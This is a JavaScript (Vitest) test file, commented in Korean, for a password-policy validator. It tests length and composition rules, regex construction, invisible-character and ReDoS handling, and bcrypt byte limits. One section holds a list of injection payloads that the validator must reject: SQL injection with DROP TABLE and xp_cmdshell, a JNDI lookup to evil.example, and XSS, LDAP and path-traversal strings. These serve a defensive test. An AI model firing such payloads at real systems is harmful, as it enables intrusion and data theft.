/**
 * 비밀번호 정책 검증.
 * 기본(NIST/ASVS 정렬) 모드와 정의서 문구 그대로인 모드를 **둘 다** 검증한다.
 */
import { describe, it, expect, afterEach, beforeEach } from 'vitest'
import {
  PASSWORD_POLICY, PASSWORD_PATTERNS, checkPassword, normalizePassword,
  countSpecials, byteLength, codePointLength, estimateStrength,
  generateCompliantSecret, passwordChecklist,
  buildPasswordRegex, passwordRegex
} from './passwordPolicy.js'

const original = { ...PASSWORD_POLICY }
afterEach(() => { Object.assign(PASSWORD_POLICY, original) })

describe('normalizePassword', () => {
  it('NFKC 로 정규화한다 — 같은 글자가 다른 코드포인트로 들어와도 같은 값이 된다', () => {
    // U+FF21 (전각 A) 는 NFKC 에서 'A' 가 된다
    expect(normalizePassword('Ａbc')).toBe('Abc')
    // 한글 자모 조합형 → 완성형
    expect(normalizePassword('한')).toBe('한')
  })
  it('정규화 결과가 서로 다른 입력에서 같아진다', () => {
    expect(normalizePassword('한갓지도-2026')).toBe(normalizePassword('한갓지도-2026'))
  })
})

describe('byteLength', () => {
  it('UTF-8 바이트 수를 센다 (bcrypt 72바이트 한계 판단용)', () => {
    expect(byteLength('abc')).toBe(3)
    expect(byteLength('한')).toBe(3)
  })
})

/*
  ⚠️ 2026-08-15 기본값이 뒤집혔다: enforceComposition 이 **true** 가 기본이다.
     요구사항 정의서 USER_002 문구와, 화면에 조건을 명시해 달라는 제품 요구 때문이다.
     아래 두 블록이 각 모드를 따로 검증한다. 둘 다 살려 두는 이유는
     되돌리는 스위치가 실제로 동작하는지 고정하기 위해서다.
*/
describe('조합 강제를 끈 모드 (NIST SP 800-63B-4 / ASVS 5.0 정렬)', () => {
  beforeEach(() => { PASSWORD_POLICY.enforceComposition = false })

  it('12자 미만은 막는다', () => {
    expect(checkPassword('short-pw-11').ok).toBe(false)
    expect(checkPassword('short-pw-11').errors.join()).toContain('12자')
  })

  it('경계값: 12자는 통과, 11자는 막힌다', () => {
    expect(PASSWORD_POLICY.minLength).toBe(12)
    expect(checkPassword('vermilion-fig').ok).toBe(true)   // 13자
    expect(checkPassword('lantern-fig9').ok).toBe(true)    // 12자
    expect(checkPassword('lantern-fig').ok).toBe(false)    // 11자
  })

  it('12자 이상 문장형은 통과한다 — 문자 종류를 섞지 않아도 된다', () => {
    const r = checkPassword('sunset over the quiet oreum')
    expect(r.ok, JSON.stringify(r.errors)).toBe(true)
  })

  it('대문자·숫자·특수문자가 하나도 없어도 통과한다 (ASVS 6.2.5)', () => {
    const r = checkPassword('walking slowly along the shore')
    expect(r.ok, JSON.stringify(r.errors)).toBe(true)
  })

  it('특수문자가 4개여도 막지 않는다 — 정의서의 상한 3개는 적용하지 않는다', () => {
    const pw = 'correct-horse-battery-staple!!!!'
    expect(countSpecials(pw)).toBeGreaterThan(3)
    expect(checkPassword(pw).ok).toBe(true)
  })

  it('상한(128자)을 넘으면 막는다 — 해시 연산 DoS 방지', () => {
    expect(checkPassword('a'.repeat(129)).ok).toBe(false)
  })

  it('64자는 허용한다 (ASVS 6.2.9)', () => {
    const pw = 'the quiet road that runs along the western shore of the island'
    expect(pw.length).toBeGreaterThanOrEqual(60)
    expect(checkPassword(pw).ok).toBe(true)
  })

  it('72바이트를 넘으면 막지는 않고 경고만 한다 (bcrypt 절단)', () => {
    const pw = 'a'.repeat(80)
    const r = checkPassword(pw)
    expect(r.warnings.length).toBeGreaterThan(0)
  })

  it('흔한 비밀번호를 막는다', () => {
    for (const pw of ['password123', 'qwertyuiop', '1q2w3e4r5t']) {
      expect(checkPassword(pw).ok, pw).toBe(false)
    }
  })

  it('이메일·닉네임·이름이 그대로 들어가면 막는다 (NIST context-specific words)', () => {
    const r = checkPassword('kimhangat-is-my-name', { email: 'kimhangat@x.com' })
    expect(r.ok).toBe(false)
    expect(r.errors.join()).toContain('이메일')
  })

  it('서비스 이름이 들어가면 강도를 낮춘다', () => {
    const withName = estimateStrength('hangatjido-walking-road')
    const without = estimateStrength('slowmorning-walking-road')
    expect(withName.bits).toBeLessThan(without.bits)
  })

  it('키보드 나열·반복을 감점한다', () => {
    expect(estimateStrength('qwertyuiopqwerty').score)
      .toBeLessThan(estimateStrength('lantern-fig-marble').score)
    expect(estimateStrength('abcabcabcabcabcabc').score).toBeLessThanOrEqual(1)
  })
})

describe('조합 강제 모드 — 현재 기본값 (정의서 USER_002)', () => {
  it('기본값이 켜져 있다', () => {
    expect(PASSWORD_POLICY.enforceComposition).toBe(true)
  })

  it('대문자·소문자·숫자·특수문자를 각각 요구한다', () => {
    expect(checkPassword('Walking-Slowly-2026').ok).toBe(true)

    const cases = [
      ['대문자 없음', 'walking-slowly-2026', '대문자'],
      ['소문자 없음', 'WALKING-SLOWLY-2026', '소문자'],
      ['숫자 없음', 'Walking-Slowly-Road', '숫자'],
      ['특수문자 없음', 'WalkingSlowly2026', '특수문자']
    ]
    for (const [name, pw, want] of cases) {
      const r = checkPassword(pw)
      expect(r.ok, name).toBe(false)
      expect(r.errors.join(), name).toContain(want)
    }
  })

  it('화면 체크리스트에 필요한 조건이 개수까지 나온다', () => {
    const items = passwordChecklist('abc')
    const keys = items.filter(i => i.required).map(i => i.key)
    expect(keys).toContain('upper')
    expect(keys).toContain('lower')
    expect(keys).toContain('digit')
    expect(keys).toContain('special')
    expect(items.find(i => i.key === 'special').label).toBe('특수문자 1~3개')
    expect(items.find(i => i.key === 'upper').label).toBe('대문자 1개 이상')
  })

  it('생성한 정규식에 네 조건이 모두 선행 탐색으로 들어간다', () => {
    const { source } = buildPasswordRegex(PASSWORD_POLICY)
    expect(source).toContain(String.raw`(?=[\s\S]*\p{Lu})`)
    expect(source).toContain(String.raw`(?=[\s\S]*\p{Ll})`)
    expect(source).toContain(String.raw`(?=[\s\S]*\p{Nd})`)
    expect(source).toContain('(?!')   // 특수문자 상한
  })

  it('⚠️ 특수문자 4개면 막는다 — 이 규칙이 더 안전한 비밀번호를 거부한다는 회귀 테스트', () => {
    const strong = 'Correct-Horse-Battery-2026!!!!'
    expect(countSpecials(strong)).toBeGreaterThan(3)
    expect(checkPassword(strong).ok).toBe(false)

    // 조합 강제를 끄면 통과한다 — 보안이 아니라 규격 때문에 막힌다는 증거
    PASSWORD_POLICY.enforceComposition = false
    expect(checkPassword(strong).ok).toBe(true)
  })

  it('한글만으로는 만들 수 없다 — 대소문자가 없는 문자 체계라 원리상 불가능하다', () => {
    // 조합 강제의 알려진 부작용. 숨기지 않고 고정해 둔다.
    const r = checkPassword('한라산일출오름산책2026!')
    expect(r.ok).toBe(false)
    expect(r.errors.join()).toContain('대문자')
  })
})

describe('passwordChecklist', () => {
  it('조합 강제를 끄면 조합 규칙을 필수로 표시하지 않는다', () => {
    PASSWORD_POLICY.enforceComposition = false
    const items = passwordChecklist('sunset over the quiet oreum')
    expect(items.every(i => i.key !== 'special')).toBe(true)
    expect(items.some(i => i.required === false)).toBe(true)
  })
  it('강제 모드(기본값)에서는 조합 규칙이 필수로 나온다', () => {
    const items = passwordChecklist('Abc-1234567890')
    expect(items.some(i => i.key === 'special' && i.required)).toBe(true)
  })
})

describe('generateCompliantSecret (ASVS 6.4.1)', () => {
  it('생성한 값은 현재 정책을 항상 만족한다', () => {
    for (let i = 0; i < 200; i++) {
      const s = generateCompliantSecret()
      const r = checkPassword(s)
      expect(r.ok, `${s} → ${JSON.stringify(r.errors)}`).toBe(true)
    }
  })
  it('매번 다른 값이 나온다', () => {
    const set = new Set(Array.from({ length: 50 }, () => generateCompliantSecret()))
    expect(set.size).toBe(50)
  })
  it('정책을 바꿔도 그 정책을 만족한다', () => {
    PASSWORD_POLICY.enforceComposition = true
    const s = generateCompliantSecret()
    expect(checkPassword(s).ok).toBe(true)
  })
})

/* ══════════════════ 정규식 규칙 ══════════════════ */

describe('정책 → 정규식 생성', () => {
  it('기본 모드는 길이만 보는 단순한 패턴이다', () => {
    const { source } = buildPasswordRegex({
      ...PASSWORD_POLICY, enforceComposition: false
    })
    // String.raw 로 써야 한다 — 일반 문자열이면 '\s' 가 's' 로 죽는다
    expect(source).toBe(String.raw`^[\s\S]{12,128}(?![\s\S])`)
  })

  it('`$` 대신 `(?![\s\S])` 로 끝을 잠근다 — 끝 줄바꿈이 통과하면 안 된다', () => {
    // JS·Java 모두 `$` 는 문자열 맨 끝 줄바꿈 앞에서 매칭된다.
    // `^…$` 였다면 128자 + 줄바꿈 = 129자가 통과했다.
    const { regex, source } = buildPasswordRegex({ ...PASSWORD_POLICY, enforceComposition: false })
    expect(source.endsWith('$')).toBe(false)
    expect(regex.test('a'.repeat(128))).toBe(true)
    expect(regex.test('a'.repeat(128) + '\n')).toBe(false)
    // 상한 안쪽이면 줄바꿈도 그냥 한 글자다(길이 12자로 셈). 막는 건 invisible 패턴 쪽 몫.
    expect(regex.test('abcdefghijkl\n')).toBe(true)
    expect(checkPassword('abcdefghijkl\n').ok).toBe(false)
  })

  it('정의서 문구 모드는 선행 탐색으로 조합 조건을 붙인다', () => {
    const { source, regex } = buildPasswordRegex({
      ...PASSWORD_POLICY,
      enforceComposition: true,
      composition: { requireUpper: true, requireDigit: true, specialMin: 1, specialMax: 3 }
    })
    expect(source).toContain(String.raw`(?=[\s\S]*\p{Lu})`)   // 대문자
    expect(source).toContain(String.raw`(?=[\s\S]*\p{Nd})`)   // 숫자
    expect(source).toContain('(?!')                     // 특수문자 상한 = 부정 선행 탐색
    expect(regex.flags).toContain('u')

    expect(regex.test('Walking-Slowly-2026')).toBe(true)
    expect(regex.test('walking-slowly-2026')).toBe(false)      // 대문자 없음
    expect(regex.test('Walking-Slowly-Road')).toBe(false)      // 숫자 없음
    expect(regex.test('WalkingSlowly2026')).toBe(false)        // 특수문자 없음
    expect(regex.test('W-a-l-k-ing-2026')).toBe(false)         // 특수문자 4개 초과
  })

  it('정책값을 바꾸면 passwordRegex() 도 따라 바뀐다 (캐시가 굳지 않는다)', () => {
    const before = passwordRegex().source
    PASSWORD_POLICY.minLength = 20
    const after = passwordRegex().source
    expect(after).not.toBe(before)
    expect(after).toContain('{20,128}')
  })

  it('`.` 가 아니라 `[\s\S]` 를 써서 줄바꿈이 길이 계산에서 빠지지 않는다', () => {
    const { regex } = buildPasswordRegex({ ...PASSWORD_POLICY, enforceComposition: false })
    // 줄바꿈 포함 12자 — `.` 였다면 매칭에 실패했을 것이다
    expect(regex.test('abcdef\nghijkl')).toBe(true)
    // 실제 정책에서는 제어문자를 따로 막는다
    expect(checkPassword('abcdef\nghijklmn').ok).toBe(false)
  })
})

describe('정규식 판정과 최종 판정의 관계', () => {
  it('정규식을 통과해도 유출·흔한 단어면 최종 불합격이다', () => {
    // 조합 조건(대·소·숫자·특수문자 1개)을 전부 만족하지만 흔한 단어가 본체다
    const pw = 'Password-123456'
    expect(passwordRegex().regex.test(pw)).toBe(true)   // 형식은 통과
    const r = checkPassword(pw)
    expect(r.matchedRegex).toBe(true)
    expect(r.ok).toBe(false)                            // 내용에서 걸림
    expect(r.errors.join()).toContain('많이 쓰이는')
  })

  it('정규식을 통과하지 못하면 이유를 짚어준다', () => {
    const r = checkPassword('short-pw-11')
    expect(r.matchedRegex).toBe(false)
    expect(r.errors[0]).toContain('12자')
  })
})

describe('고정 패턴표', () => {
  it('특수문자 정의는 ASCII 기호만 센다', () => {
    expect(countSpecials('a!b@c#')).toBe(3)
    expect(countSpecials('가·나—다')).toBe(0)   // 문장부호·특수기호는 세지 않는다
  })

  it('보이지 않는 문자를 전부 잡아낸다', () => {
    const blocked = {
      'NUL U+0000': ' ',
      'TAB U+0009': '\t',
      'LF U+000A': '\n',
      'CR U+000D': '\r',
      'NEL U+0085': '',
      'SHY U+00AD': '­',
      'ZWSP U+200B': '​',
      'LS U+2028': ' ',
      'RLO U+202E': '‮',
      'BOM U+FEFF': '﻿'
    }
    for (const [name, ch] of Object.entries(blocked)) {
      expect(PASSWORD_PATTERNS.invisible.test(ch), name).toBe(true)
    }
  })

  it('보이는 문자는 무엇도 막지 않는다 — 공백·한글·기호·이모지', () => {
    for (const ch of [' ', '한', 'あ', '漢', 'Я', 'é', '!', '@', '#', '$', '%', "'", '"', ';', '\\', '\u{1F44D}']) {
      expect(PASSWORD_PATTERNS.invisible.test(ch), JSON.stringify(ch)).toBe(false)
    }
  })

  it('ZWJ(U+200D)는 허용한다 — 가족 이모지가 깨지면 안 된다', () => {
    expect(PASSWORD_PATTERNS.invisible.test('‍')).toBe(false)
    expect(PASSWORD_PATTERNS.invisible.test('\u{1F468}‍\u{1F469}‍\u{1F467}')).toBe(false)
  })

  it('소스 코드 자체에 보이지 않는 문자가 없다', async () => {
    // 이 패턴을 정규식 리터럴에 날문자로 넣었다가 편집 중 사라진 적이 있다. 회귀 방지.
    const fs = await import('node:fs')
    const src = fs.readFileSync(new URL('./passwordPolicy.js', import.meta.url), 'utf8')
    const found = [...src].filter(c => /\p{Cf}/u.test(c))
    expect(found.map(c => 'U+' + c.codePointAt(0).toString(16))).toEqual([])
  })

  it('같은 글자 4연속·조각 반복·키보드 나열을 잡아낸다', () => {
    expect(PASSWORD_PATTERNS.repeatedChar.test('aaaa')).toBe(true)
    expect(PASSWORD_PATTERNS.repeatedChar.test('aaa')).toBe(false)
    expect(PASSWORD_PATTERNS.repeatedUnit.test('abcabcabc')).toBe(true)
    expect(PASSWORD_PATTERNS.repeatedUnit.test('abcdefghi')).toBe(false)
    expect(PASSWORD_PATTERNS.sequence.test('xx1234xx')).toBe(true)
    expect(PASSWORD_PATTERNS.sequence.test('xxqwerxx')).toBe(true)
    expect(PASSWORD_PATTERNS.sequence.test('lantern-fig')).toBe(false)
  })

  it('공백만 있는 값을 막는다', () => {
    expect(checkPassword('              ').ok).toBe(false)
    expect(checkPassword('              ').errors[0]).toContain('공백')
  })
})

describe('길이 세는 기준', () => {
  it('이모지를 1자로 센다 (UTF-16 단위가 아니라 코드포인트)', () => {
    const pw = '👍👍👍👍👍👍👍👍👍👍👍👍'   // 코드포인트 12개, .length 는 24
    expect(pw.length).toBe(24)
    expect(codePointLength(pw)).toBe(12)
    // 정규식의 {12,128} 도 u 플래그라 코드포인트로 센다 → 기준이 일치한다.
    // 조합 조건은 이 테스트의 관심사가 아니므로 길이만 보는 모드에서 확인한다.
    PASSWORD_POLICY.enforceComposition = false
    expect(passwordRegex().regex.test(pw)).toBe(true)
  })

  it('바이트 수는 따로 센다 (bcrypt 72바이트 판정용)', () => {
    expect(byteLength('한글비밀번호입니다열두자')).toBe(36)
  })
})

describe('ReDoS 내성', () => {
  it('악의적인 긴 입력에도 즉시 끝난다', () => {
    const evil = 'a'.repeat(50000) + '!'
    const t0 = Date.now()
    const r = checkPassword(evil)
    const ms = Date.now() - t0
    expect(r.ok).toBe(false)
    // 길이 상한을 먼저 보고 잘라내므로 다른 패턴이 돌지 않는다
    expect(ms, `${ms}ms 걸림`).toBeLessThan(50)
  })

  it('상한 이내의 최악 입력도 선형 시간 안에 끝난다', () => {
    PASSWORD_POLICY.enforceComposition = true
    const worst = 'A1' + 'a'.repeat(124) + '!'   // 128자, 모든 선행 탐색을 끝까지 훑게 만든다
    const t0 = Date.now()
    for (let i = 0; i < 200; i++) passwordRegex().regex.test(worst)
    const ms = Date.now() - t0
    expect(ms, `200회 ${ms}ms`).toBeLessThan(200)
  })
})

/* ══════════════════ 인젝션 문자 ══════════════════ */

describe('공격 문자열 차단 (blockAttackPatterns)', () => {
  /*
    ⚠️ 이 차단은 **인젝션 방어가 아니다.**
       비밀번호는 해시된 뒤 파라미터 바인딩으로만 전달되므로,
       원문에 따옴표가 있든 없든 SQL 인젝션은 성립하지 않는다(CWE-89).
       OWASP 는 이런 차단 목록을 "massively flawed approach" 라고 못 박는다.
    켜 둔 이유는 운영 쪽이다(WAF 가 요청을 떨궈 로그인 불가 계정이 생기는 사고 방지).
    상세 근거는 security/attackPatterns.js 주석 참고.

    아래 두 테스트가 **함께** 있어야 의미가 있다.
      ① 페이로드는 막힌다
      ② 문자 하나 때문에 막히는 일은 없다  ← 이게 무너지면 그냥 나쁜 규칙이 된다
  */
  /*
    조합 강제를 **꺼 놓고** 본다. 켜 두면 페이로드가 "대문자 없음" 같은 다른 이유로도
    막혀서, 공격 문자열 차단이 실제로 동작하는지 구분할 수 없다. 축을 하나만 움직인다.
    조합 강제 상태에서도 차단되는지는 아래 마지막 테스트에서 따로 본다.
  */
  beforeEach(() => { PASSWORD_POLICY.enforceComposition = false })

  const payloads = [
    "' OR '1'='1' -- padding",
    "'; DROP TABLE users; --",
    '" OR ""="" padding',
    "1' UNION SELECT NULL,NULL--",
    '${jndi:ldap://evil.example/a}',
    '{"$ne": null} padding',
    '*)(uid=*))(|(uid=*',
    '<script>alert(1)</script>',
    '../../../../etc/passwd',
    "'; EXEC xp_cmdshell('dir');--",
    '%27%20OR%201%3D1%20--',
    String.raw`\x27 OR 1=1 -- padding`
  ]

  it('12종을 전부 막는다', () => {
    for (const pw of payloads) {
      const r = checkPassword(pw)
      expect(codePointLength(pw), pw).toBeGreaterThanOrEqual(PASSWORD_POLICY.minLength)
      expect(r.ok, `막혔어야 함: ${pw}`).toBe(false)
      expect(r.errors.join(), pw).toContain('공격 문자열')
    }
  })

  it('막는 것은 형식(정규식)이 아니라 내용이다', () => {
    // 길이 조건은 여전히 통과한다 — 문자 종류를 정규식에서 뺀 게 아니라는 뜻
    for (const pw of payloads) {
      expect(checkPassword(pw).matchedRegex, pw).toBe(true)
    }
  })

  it('특수문자가 들어 있다는 이유만으로는 막지 않는다', () => {
    for (const ch of ['\'', '"', ';', '`', '<', '>', '$', '{', '}', '*', '|', '&', '\\', '%', '#']) {
      const pw = `quiet lantern ${ch} morning road`
      const r = checkPassword(pw)
      expect(r.ok, `${JSON.stringify(pw)} → ${JSON.stringify(r.errors)}`).toBe(true)
    }
  })

  it('평범한 영어 문장을 오탐하지 않는다', () => {
    for (const pw of [
      'I select the blue one from three',
      'salt and pepper and olive oil',
      'Bank-Of-Jeju--2026 winter',
      'my password is 100% secure!'
    ]) {
      const r = checkPassword(pw)
      expect(r.ok, `${pw} → ${JSON.stringify(r.errors)}`).toBe(true)
    }
  })

  it('끄면 다시 통과한다 — 되돌리는 스위치가 실제로 동작한다', () => {
    PASSWORD_POLICY.blockAttackPatterns = false
    for (const pw of payloads) {
      const r = checkPassword(pw)
      expect(r.ok, `${pw} → ${JSON.stringify(r.errors)}`).toBe(true)
    }
  })

  it('조합 강제 모드에서도 페이로드는 막힌다 — 두 규칙이 서로 무관하다', () => {
    PASSWORD_POLICY.enforceComposition = true
    // 대·소문자와 숫자, 특수문자 3개를 갖춰 조합 조건을 만족시킨 페이로드
    const pw = "Robert1' OR 1=1"
    expect(checkPassword(pw).matchedRegex, '형식은 통과해야 한다').toBe(true)
    const r = checkPassword(pw)
    expect(r.ok).toBe(false)
    expect(r.errors.join()).toContain('공격 문자열')
  })

  it('조합 강제 모드에서도 특수문자 자체로는 막지 않는다', () => {
    PASSWORD_POLICY.enforceComposition = true
    // 대·소문자·숫자 + 특수문자 3개(`'` 와 하이픈 2개) — 조합 조건을 만족한다
    expect(checkPassword("Quiet-Lantern'2026").ok).toBe(true)
  })
})

describe('bcrypt 72바이트 경계', () => {
  it('72바이트까지는 경고가 없고, 넘으면 경고한다', () => {
    const cases = [
      ['ASCII 72자', 'a'.repeat(72), false],
      ['ASCII 73자', 'a'.repeat(73), true],
      ['한글 24자(72바이트)', '가'.repeat(24), false],
      ['한글 25자(75바이트)', '가'.repeat(25), true],
      ['이모지 18개(72바이트)', '\u{1F44D}'.repeat(18), false],
      ['이모지 19개(76바이트)', '\u{1F44D}'.repeat(19), true]
    ]
    for (const [name, pw, shouldWarn] of cases) {
      expect(byteLength(pw) > 72, `${name} 바이트=${byteLength(pw)}`).toBe(shouldWarn)
      expect(checkPassword(pw).warnings.length > 0, name).toBe(shouldWarn)
    }
  })

  it('길이는 코드포인트로, 해시 한계는 바이트로 — 기준이 다르다', () => {
    const pw = '가'.repeat(12)
    expect(codePointLength(pw)).toBe(12)   // 정책상 12자 → 통과
    expect(byteLength(pw)).toBe(36)        // bcrypt 기준 36바이트
  })
})
